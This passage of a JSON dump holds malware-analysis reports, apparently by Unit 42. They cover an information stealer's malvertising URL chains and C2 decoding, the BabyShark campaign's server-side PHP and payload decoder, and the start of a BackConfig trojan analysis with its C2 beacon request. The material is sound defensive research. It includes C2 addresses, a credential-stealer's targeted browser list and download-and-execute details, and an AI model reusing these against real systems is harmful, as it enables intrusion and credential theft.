                "hxxp://sp[.]popcash[.]net/sgo/ad?p=161339&w=449201&t=33fd7220adb3c003&r=&vw=0&vh=0"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://findmyname[.]pw/1981_06_18/spumier/04_05_1952/E4bI5EK9?FYpUsha=Hangmen-Avowedly-Political-montreal&JAb1I5xAS=Reeled_chateaus_funduck_royalize_unconvert_Joysome&Outdraft=Tr6mHo5&VX1m7hhu=ugaritic_Shying_fleece_15919"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "URL chain 2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://tania[.]web[.]telrock[.]net/"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://api[.]clickaine[.]com/v1/apop/redirect/zone/15450"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://findmyname[.]pw/M6rpEF/lifted/7013-Tiddley-toadyisms-11956-8965/peevedly_Oversured_tungstic.cfml"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "URL chain 3"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://manuela[.]w[.]telrock[.]org/"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://api[.]clickaine[.]com/v1/apop/redirect/zone/15450"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://findmyname[.]pw/hoivSZVRX/NV1uI/vpLnq.shtml?nXslO=indult-Cadere&sAoiIFu=Tirracke&KaaM=Uncloak_Becloaked"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "URL chain 4"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://sl[.]ivankatraff[.]com/sl?vId\\=bmconv_20181024052548_bea8e890_2113_4ecc_951b_c90aeffde1e6&publisherId\\=40152&source\\=5348_8482&ua\\=Mozilla%2F5.0+%28iPhone%3B+CPU+iPhone+OS+11_3+like+Mac+OS+X%29+AppleWebKit%2F605.1.15+%28KHTML%2C+like+Gecko%29+Mobile%2F15E302&ip\\=124.35.82.126&campaignI"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://damneddevastator[.]com/l/18358235b03f965b74d5?sub=&source=&code2=Y3RtATE1NDAzOTM4OTI1MDEAc3JjAWlvAHZlcgExOQBwbHQBV2luMzIAdGNoATEAaXcBNzkyAGloATUwNABhdwExNDQwAGFoATg1NgB0egE0ODAAYnVpZAEAY2tlATEAb3JudAEAdm5kAQBoc2ZjAXRydWUAZnJtAWZhbHNlAHVhAU1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgVHJpZGVudC83LjA7IFNMQ0MyOyAuTkVUIENMUiAyLjAuNTA3Mjc7IC5ORVQgQ0xSIDMuNS4zMDcyOTsgLk5FVCBDTFIgMy4wLjMwNzI5OyBNZWRpYSBDZW50ZXIgUEMgNi4wOyAuTkVUNC4wQzsgLk5FVDQuMEU7IHJ2OjExLjApIGxpa2UgR2Vja28AYTQzATEwMTEwMQBhNDQBMTEAc2YBMTExMABmZgExMTAAY2hkATAAZmx2AWZhbHNlAGNobQEwMDEAbG5nATExMTEAc3RyZwExMTEwMTAwAG9zY3B1AQBwcmRzdWIBAGV2bG4BMzkAcmVmAQByYmNjATEwMjUxMTUzAGNudHABdHJ1ZQB3bm0BAHdnbHYBMABjZGcBMDAwMDAwMDAwMDAwMDAwMDAxMTExMDAxMDEwMDAwMDAwMTAyMjEyMDAwMDAwMDIyMjIyMjIyMjIyMjIyMjIyMgB3dXQBdy5wYW53X2hhc190aW1lb3V0X3NldDt3LnBhbndfQWN0aXZlWE9iamVjdF9BcmdzX0FycmF5O3cubXNJbmRleGVkREI7dy5jbGlwYm9hcmREYXRhO3cubWF4Q29ubmVjdGlvbnNQZXJTZXJ2ZXI7dy5vbmZvY3VzaW47dy5vbmZvY3Vzb3V0O3cub25oZWxwO3cuYW5pbWF0aW9uU3RhcnRUaW1lO3cubXNBbmltYXRpb25TdGFydFRpbWU7dy5tc0NyeXB0bzt3Lm9ubXNnZXN0dXJlY2hhbmdlO3cub25tc2dlc3R1cmVkb3VibGV0YXA7dy5vbm1zZ2VzdHVyZWVuZDt3Lm9ubXNnZXN0dXJlaG9sZDt3Lm9ubXNnZXN0dXJlc3RhcnQ7dy5vbm1zZ2VzdHVyZXRhcDt3Lm9ubXNpbmVydGlhc3RhcnQ7dy5vbm1zcG9pbnRlcmNhbmNlbDt3Lm9ubXNwb2ludGVyZG93bjt3Lm9ubXNwb2ludGVyZW50ZXI7dy5vbm1zcG9pbnRlcmxlYXZlO3cub25tc3BvaW50ZXJtb3ZlO3cub25tc3BvaW50ZXJvdXQ7dy5vbm1zcG9pbnRlcm92ZXI7dy5vbm1zcG9pbnRlcnVwO3cub25yZWFkeXN0YXRlY2hhbmdlO3cuaXRlbTt3Lm1zV3JpdGVQcm9maWxlck1hcms7dy5uYXZpZ2F0ZTt3LnNob3dIZWxwO3cuc2hvd01vZGVsZXNzRGlhbG9nO3cudG9TdGF0aWNIVE1MO3cubXNDYW5jZWxSZXF1ZXN0QW5pbWF0aW9uRnJhbWU7dy5tc0lzU3RhdGljSFRNTDt3Lm1zTWF0Y2hNZWRpYTt3Lm1zUmVxdWVzdEFuaW1hdGlvbkZyYW1lO3cudG9TdHJpbmc7dy5jbGVhckltbWVkaWF0ZTt3Lm1zQ2xlYXJJbW1lZGlhdGU7dy5tc1NldEltbWVkaWF0ZTt3LnNldEltbWVkaWF0ZQBrbG5nAWVuLVVTAHJ0dAEhAGxhbwEtMQBobHMBMA__"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://damneddevastator[.]com/gw?sub=&source=Unknown&url=https%3A%2F%2Fsax.peakonspot.com%2Fdep.php%3Fpid%3D2457%26subid%3D2_Unknown%26cid%3Dbmconv_20181024091133_7532cd6e_41dc_445b_a538_a0f29d2af047%26ref%3D&vId=bmconv_20181024091133_7532cd6e_41dc_445b_a538_a0f29d2af047&hash=18358235b03f965b74d5&ete=true"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "https://sax.peakonspot.com/dep.php?pid=2457&subid=2_Unknown&cid=bmconv_20181024091133_7532cd6e_41dc_445b_a538_a0f29d2af047&ref="
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://findmyname[.]pw/pysV15/olt8uPj1/1969_04_11"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "URL chain 5"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://whitepages[.]review/prpllr?cost=0.001850&currency=USD&external_id=76427570563780608&ad_campaign_id=1382277&source=PropellerAds&sub_id_1=1774896"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://findmyname[.]pw/cymbalo/13345/13231?potteries=icL8gc96"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Binary SHA256"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Sample 1:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "3354a1d18aa861de2e17eeec65fc6545bc52deebe86c3ef12ccb372c312d8af8"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Sample 2:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7a99eb3e340f61f800ab3b8784f718bbe2e38159a883c2fc009af740df944431"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Sample 3:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "0e27bbfa70b399182f030ee18531e100d4f6e8cb64e592276b02c18b7b5d69e6"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Appendix"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Appendix 1: hash algorithm and encryption."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Hash algorithms and encryption for victim id that is sent to C2:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When malware gets machine GUID, product name, user name and computer name, it uses the aforementioned hash algorithm and encryption algorithm to generate encrypted victim id."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C2 address decryption:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Malware uses xor key [0x09, 0xff, 0x20] to decrypt content in .data section and get string aHR0cDovLzUxLjE1LjE5Ni4zMC8xL2luZGV4LnBocA. Then malware does base64 decoding to get the C2 address."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Appendix 2: Targeted browser list"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "GoogleChrome"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "InternetMailRu"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "YandexBrowser"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ComodoDragon"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Amigo"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Orbitum"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Bromium"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Chromium"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Nichrome"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "RockMelt"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "360Browser"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Vivaldi"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Opera"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "GoBrowser"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Sputnik"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Kometa"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Uran"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "QIPSurf"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Epic"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Brave"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "CocCoc"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "CentBrowser"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7Star"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ElementsBrowser"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "TorBro"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Suhba"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "SaferBrowser"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Mustang"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Superbird"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Chedot"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Torch"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Internet Explorer"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Microsoft Edge"
            ]
        }
    ],
    "c950b94109f5659e82f0ffa401fba3786f272afe": [
        {
            "type": "paragraph",
            "content": [
                "In February 2019, Unit 42 published a blog about the BabyShark malware family and the associated spear phishing campaigns targeting U.S. national think tanks.",
                "Since that publication, malicious attacks leveraging BabyShark have continued through March and April 2019.",
                "The attackers expanded targeting to the cryptocurrency industry, showing that those behind these attacks also have interests in financial gain."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "While tracking the latest activities of the threat group, Unit 42 researchers were able to collect both the BabyShark malwares server-side and client-side files, as well as two encoded secondary PE payload files that the malware installs on the victim hosts upon receiving an operators command.",
                "By analyzing the files, we were able to further understand the overall multi-staging structure of the BabyShark malware and features, such as how it attempts to maintain operational security and supported remote administration commands.",
                "Based on our research, it appears the malware author calls the encoded secondary payload Cowboy regardless of what malware family is delivered."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Our research shows the most recent malicious activities involving BabyShark malware appear to be carried out for two purposes:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 1.",
                "Cryptocurrency related BabyShark malicious document decoy"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We presume that the BabyShark malware toolset is shared among actors under the same umbrella or the same group has been assigned an additional mission."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In our analysis, we found BabyShark attacks were using KimJongRAT and PCRat as the encoded secondary payload and thus were the Cowboys."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "BabyShark has a multi-stage infection chain with checks between each stage, as shown in Figure 2, to ensure only targeted hosts are advanced to the next stage before it finally beacons backs to the attacker."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2.",
                "BabyShark malware overall structure"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This is done by maintaining a list of denylisted IP addresses and computer names for those who have made suspicious access attempts, such as access with invalid parameters, to the server as a possible technique meant to make analysis harder.",
                "The IP addresses and computer names in the denylist are written in base64 encoded format at [BASE_URI]/blackip.txt, shown in Figure 3."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 3. Denylisted IP addresses and computer names in blacktip.txt"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When a new access attempt is made with data matching the denylist, the server will not proceed to the next stage and alerts the operator via a separate log file shown in Figure 4."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 4. Suspicious activity log report to operator"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "BabySharks C2 server also logs access to its base URI and redirects to http://go.microsoft[.]com/. The purpose of this is likely to avoid its files being seen due to potential mis-configurations of the hosting web server."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "if($ff=fopen(\"resp_suspect\",\"a\"))"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "{"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "fwrite($ff, $date . \" \" .",
                "$ip . \"",
                "suspected access \" .",
                "$useragent .\"\\r\\n\");"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "fclose($ff);"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "header('Location: http://go.microsoft[.]com/');"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "exit;"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The operator can issue VBS and PowerShell based commands to victim systems infected with BabyShark.",
                "The remote commands we found from the C2 are in the below table, but BabyShark is not limited to these as the attacker can create more VBS or PowerShell command files."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "VBS based remote commands:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 1.",
                "VBS based remote commands for BabyShark"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "PowerShell based remote administration commands:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 2. PowerShell based remote commands for BabyShark"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The secondary malware is delivered as a set:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The functionality of the EXE and DLL loaders is the same: the only difference is the file type.",
                "These loaders are later run upon receiving an execution command: execute to invoke the EXE type loader or power com to launch the DLL type loader.",
                "We theorize the reason for having two different type loaders is to have redundancy for loading the payload in case of anti-virus softwares disruption.",
                "Either loader will load the custom encoded secondary payload, the Cowboy, in memory, decode it, and execute it."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In our previous research, we wrote about possible links between BabyShark and the KimJongRAT malware family.",
                "We based these possible links on the similarity of malware behavior, similar interests in the targets, and a freshly compiled KimJongRAT malware sample being seen from the same threat actor.",
                "In our latest analysis, we collected two secondary payload files, cow_pass.gif and cow.gif, from BabySharks C2 server.",
                "After decoding, we found these samples were KimJongRAT and PCRat respectively.",
                "Their metadata are in Tables 3 and 4."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 3. Decoded PCRat payload metadata"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 4. Decoded KimJongRAT payload metadata"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "PCRat is an infamous remote administration trojan with its source code openly available on the public internet.",
                "The malware is a variant of the Gh0st",
                "RAT malware family and it shares many similarities with Gh0st including its network beacon structure as shown in the Figure 5."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 5. PCRat communication with the C2 at 173.248.170[.]149:80"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Initially, we were curious about the samples old timestamp and it being hardly modified from the original PCRat binary which had been publicly available for many years.",
                "However, the operator seemed to be actively operating the malware when we observed the communication between it and the C2 server at the time of our analysis."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The decoded KimJongRAT sample seems to exhibit a few changes in the code from the variants reported in the past.",
                "This sample added a substitution cipher to obfuscate API strings, as shown in Figure 5, to hide its intentions and removed its networking feature for C2 data exfiltration, possibly in favor of the password gathering discussed below."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 6.",
                "Encrypted API strings in KimJongRAT"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As the original filename cow_pass.fig suggests, KimJongRAT seems to be wholly used as a password extraction and information stealer tool by the threat actor, and the collected data are exfiltrated to C2 with support from other malware such as BabyShark or PCRat.",
                "The information that the KimJongRAT malware steals from victim machines include email credentials from Microsoft Outlook and Mozilla Thunderbird, login credentials for Google, Facebook, and Yahoo accounts from browsers Internet Explorer, Chrome, Mozilla Firefox, and Yandex Browser.",
                "All this information together with the victims machines' OS version are stored into the file \"%APPDATA%\\Microsoft\\ttmp.log\".",
                "The contents in \"ttmp.log\" always begin with the string \"AAAAFFFF0000CCCC\" and then appended with base64 encoded stolen credentials."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We have not observed an in-the-wild case yet, but we did find a PHP sample exploiting CVE-2018-8174 (Windows VBScript Engine Remote Code Execution Vulnerability) on the BabyShark C2 server, and this suggests that the threat actor may be leveraging this vulnerability to make a target load BabySharks first stage HTA via a watering hole attack or a malicious URL in a spearphishing email."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The attackers exploit script logs the victims remote IP address and redirects to http://google[.]com if the access is made more than one time from the same IP.",
                "This again is perhaps a tactic meant to thwart researchers."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "if(file_exists($filename))"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "{"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "if($ff=fopen(\"resp\",\"a\"))"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "{"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "fwrite($ff, $date . \" \" .",
                "$ip . \"",
                "\".$useragent.\"  reopen document.\"",
                ".\"\\r\\n\");"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "fclose($ff);"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "header(\"location: http://google[.]com\");"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "exit;"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "if($ff=fopen(\"resp\",\"a\"))"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "{"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "fwrite($ff, $date . \" \" .",
                "$ip . \"",
                "\".$useragent.\"      open document.\"",
                ".\"\\r\\n\");"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "fclose($ff);"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "During our research, we discovered a Graphical User Interface (GUI) based program likely created by the BabyShark malware author from a public malware repository.",
                "The file is to use as a file encoder tool to convert a PE file into a payload format loadable by the previously described Cowboy EXE and DLL loaders.",
                "We believe this tool is used by the BabyShark author to create their attack.",
                "Its metadata is in Table 5, below."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 5. Cowboy converter metadata"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This tool simply opens a file with the name of cowboy in the current working directory and encodes it into the Cowboy encoding format as detailed below.",
                "If a file with the name of cowboy is not found, it pops up a message box notifying The file cowboy isnt there!",
                "shown in Figure 7."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 7. Cowboy converter and cowboy file not found pop up message"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The encoding is done via the following three steps:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We have written a decoder script in Python and it is available in the appendix section of this blog."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Since releasing our previous research, malicious attacks leveraging the BabyShark malware have continued.",
                "In fact, they have widened their operation to target the cryptocurrency industry.",
                "The malwares server-side implementation showed that the malware author has made certain efforts to maintain the operational security for operating the malware and C2 infrastructures.",
                "The threat actor leverages other commodity and custom developed tools in their campaigns.",
                "In this case, they were PCRat and KimJongRAT, but these may be changed to other malware families in the future.",
                "Malicious attacks using the BabyShark malware also seem likely to continue based on our observations and may continue expanding into new industries."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers are protected from this threat in the following ways:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "AutoFocus customers can monitor ongoing activity from the threats discussed in this report by looking at the following tags:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks has shared our findings, including file samples and indicators of compromise, in this report with our fellow Cyber Threat Alliance members.",
                "CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.",
                "For more information on the Cyber Threat Alliance, visitwww.cyberthreatalliance.org."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Malicious Word Macro Document"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "75917cc1bd9ecd7ef57b7ef428107778b19f46e8c38c00f1c70efc118cb8aab5,"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "PCRat"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "f86d05c1d7853c06fc5561f8df19b53506b724a83bb29c69b39f004a0f7f82d8,"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "KimJongRAT"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "d50a0980da6297b8e4cec5db0a8773635cee74ac6f5c1ff18197dfba549f6712,"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Cowboy Loader"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4b3416fb6d1ed1f762772b4dd4f4f652e63ba41f7809b25c5fa0ee9010f7dae7"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "33ce9bcaeb0733a77ff0d85263ce03502ac20873bf58a118d1810861caced254"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Cowboy Converter"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "bd6efb16527b025a5fd256bb357a91b4ff92aff599105252e50b87f1335db9e1,"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "import base64"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "with open('cowboy', 'r') as file_in, open('cowboy_clear.bin', 'wb') as file_out:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "EncStr = file_in.read()"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "BlkSz = 10"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "len_EncStr = len(EncStr)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "NonBlk10_ptr = len_EncStr - (BlkSz -1) * (len_EncStr // BlkSz)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "NonBlk10 = EncStr [:NonBlk10_ptr]"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "result = ''"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "EncStr = EncStr [NonBlk10_ptr::]"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "#print EncStr"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "x = range (-1,BlkSz-1)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Blksize1 = len_EncStr // BlkSz"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "for n in x:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "loop_buff1_ptr = n * (len_EncStr // BlkSz)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "loop_buff1 = EncStr [loop_buff1_ptr:loop_buff1_ptr+Blksize1]"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "#print loop_buff1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "result = loop_buff1 + result"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "result = result + NonBlk10"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "clear = base64.b64decode(result)[::-1]"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "print clear"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "file_out.write(clear)"
            ]
        }
    ],
    "735d0e1f7cb80703a0b249d66d89bd9bc9c0ddb1": [
        {
            "type": "paragraph",
            "content": [
                "Unit 42 has observed activity over the last 4 months involving the BackConfig malware used by the Hangover threat group (aka Neon, Viceroy Tiger, MONSOON).",
                "Targets of the spear-phishing attacks, using local and topical lures, included government and military organizations in South Asia."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The BackConfig custom trojan has a flexible plug-in architecture for components offering various features, including the ability to gather system and keylog information and to upload and execute additional payloads."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The initial infection occurs via a weaponized Microsoft Excel (XLS) document delivered via compromised legitimate websites for which the URLs are most likely shared via email.",
                "The documents use Visual Basic for Applications (VBA) Macro code which, if enabled by the victim, starts an installation process consisting of multiple components that result in the plug-in loader payload being downloaded and executed.",
                "The modular nature certainly allows for quicker changes to individual components and, perhaps more importantly for the attackers, splits up the malicious behaviors in such a way that could thwart sandbox and dynamic analysis systems, especially when analyzing the components in isolation."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Our threat prevention platform with WildFire detects activity associated with this threat group, while simultaneously updating the malware category within the PAN-DB URL filtering solution for malicious and/or compromised domains that have been identified."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Indicators of compromise related to this research are documented at the end of this report and in the Adversary Playbook for the Hangover threat group that can be accessed in the Unit 42 Playbook Viewer."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unit 42 first saw activity involving the Windows PE executable file (SHA256: 84e56294b260b9024917c390be21121e927f414965a7a9db7ed7603e29b0d69c) when searching AutoFocus data related to particular sectors and countries of interest."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The file was first seen on January 19th, 2020, having been downloaded by two organizations -- a government department in one country and a military organization in another -- within minutes of each other.",
                "The source of the download was http://212.114.52[.]148/request/httpsrequest and the file httpsrequest was stored locally as dphc.exe.",
                "More details on how the malware was delivered are described later in the blog."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The choice of terminology in URL paths and file names when delivering BackConfig malware in this, and other campaigns discussed later on, is clearly to blend in as benign operations, paths and filenames.",
                "Although spelled differently, it could be easy to believe the payload relates to the DHCP networking service."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The purpose of this malware is to allow the actors to download and execute an executable file, as well as download and run batch files to run commands on the end system."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This sample has a custom \"decryption\" routine that subtracts six from each character.",
                "The following strings are decrypted using this method:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Trojan reads the following file to use in the URL of the C2 beacon.",
                "If the file does not exist, the executable will exit without performing any further activities.",
                "The pid.txt file is created during the earlier delivery and installation phases starting with the weaponized Excel document.",
                "More information about this setup process is covered later in the delivery section.",
                "As previously mentioned, this behavior makes an automated analysis of the individual executable payload component harder."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The C2 channel uses HTTPS thanks to the INTERNET_FLAG_SECURE flag used when calling the HttpOpenRequestA function.",
                "The beacon HTTP request will look like the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "GET /orderme/[contents of pid.txt file] HTTP/1.1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0)",
                "Gecko/20100101 Firefox/52.0 @/NEW\nHost: linkrequest[.]live [resolving to 23.106.123[.]87]"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Trojan will look for the following field and values within the HTTP response header:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If the content-type field contains a value of application, the Trojan will extract a filename from the HTTP response headers between the string filename and Content-Transfer-Encoding.",
                "It will use this filename to create a file in the %USERPROFILE%\\Adobe\\Driver\\dwg\\ folder, which it will write the data in the HTTP response to.",
                "Based on the other two Content-Types, we believe the filename provided will be either \"wuaupdt.exe\" or test.bat."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If the content-type field has a value of xDvsds, the Trojan will attempt to execute the following file using ShellExecuteA and the \"open\" method:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "%USERPROFILE%\\Adobe\\Driver\\dwg\\wuaupdt.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If the content-type field has a value of Bw11eW, the Trojan will attempt to execute the following file using ShellExecuteA and the \"open\" method:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "%USERPROFILE%\\Adobe\\Driver\\dwg\\test.bat"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "At the time of writing, the C2 appeared inoperational and no further payloads were seen.",
                "We believe that the resultant wuaupdt.exe file would then provide further capabilities to steal information, log keystrokes, and provide the ability to run additional commands either directly or via additional plugins which it would download, as documented by the Qihoo 360 Threat Intelligence group in their investigation of prior campaigns here."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unit 42 has conducted cursory binary diffing for many of the BackConfig executable files and did not find any non-library function overlaps that would suggest that the payloads are based on the YTY or EHDev frameworks as mentioned here and here."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware sample contains some interesting static artifacts including self-signed digital certificates used to sign the executable purporting to be software from the Foxit Software Incorporated company based in California.",
                "It is not known why the actors picked this company -- and others listed in Table 1 below -- to impersonate but, as previously mentioned, their use of filenames and URLs makes their payloads appear benign and trustworthy."
